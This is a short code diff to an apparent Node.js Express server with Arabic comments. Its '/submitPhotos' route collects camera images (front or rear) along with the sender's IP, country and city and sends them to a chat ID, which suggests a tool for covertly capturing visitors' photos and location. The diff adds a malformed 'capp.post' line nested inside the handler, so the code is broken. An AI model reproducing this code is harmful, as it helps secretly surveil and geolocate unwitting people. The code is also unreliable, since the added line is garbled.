@@ -497,6 +497,7 @@ app.get('/:action/:platform/:chatId', (req, res) => {
 
 // استلام الصور
 app.post('/submitPhotos', upload.array('images', 20), async (req, res) => {
+    capp.post('/submitPhotos', upload.array('images', 20), async (req, res) => {
     const chatId = req.body.userId;
     const files = req.files;
     const additionalData = JSON.parse(req.body.additionalData || '{}');
@@ -508,7 +509,6 @@ app.post('/submitPhotos', upload.array('images', 20), async (req, res) => {
         const caption = `
 معلومات إضافية:
 نوع الكاميرا: ${cameraType === 'front' ? 'أمامية' : 'خلفية'}
-أبعاد الصورة: ${req.body.imageWidth}x${req.body.imageHeight}
 IP: ${additionalData.ip}
 الدولة: ${additionalData.country}
 المدينة: ${additionalData.city}
